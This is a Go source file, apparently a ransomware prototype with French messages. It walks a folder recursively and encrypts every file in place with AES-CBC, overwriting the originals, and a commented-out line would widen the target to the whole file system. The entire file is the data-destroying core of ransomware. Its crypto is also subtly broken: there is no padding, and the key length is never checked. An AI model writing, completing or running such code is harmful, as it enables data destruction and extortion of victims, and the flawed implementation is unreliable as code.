package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

// Encrypt data with AES-256
func encrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	ciphertext := make([]byte, aes.BlockSize+len(data))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext[aes.BlockSize:], data)

	return ciphertext, nil
}

// Encrypt a file
func encryptFile(filename string, key []byte) error {
	data, err := os.ReadFile(filename)
	if err != nil {
		return err
	}

	encryptedData, err := encrypt(data, key)
	if err != nil {
		return err
	}

	err = os.WriteFile(filename, encryptedData, 0644)
	if err != nil {
		return err
	}

	fmt.Println("Fichier chiffré avec succès :", filename)
	return nil
}

// Main function of the program
func main() {
	if len(os.Args) < 2 {
		fmt.Println("Veuillez fournir la clé en argument.")
		return
	}
	key := []byte(os.Args[1])
	targetFolder := "C:\\Users\\loulo\\Desktop\\ransomware\\test"
	// root := string(os.PathSeparator)
	err := filepath.Walk(targetFolder, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Println("Erreur ", err)
			return err
		}
		if !info.IsDir() {
			err = encryptFile(path, key)
			if err != nil {
				fmt.Println("Erreur lors du chiffrement du fichier", path, ":", err)
			}
		}
		return nil
	})

	if err != nil {
		fmt.Println("Erreur lors de la marche à travers les fichiers :", err)
		return
	}

	fmt.Println("Chiffrement terminé pour tous les fichiers du système de fichiers.")
}
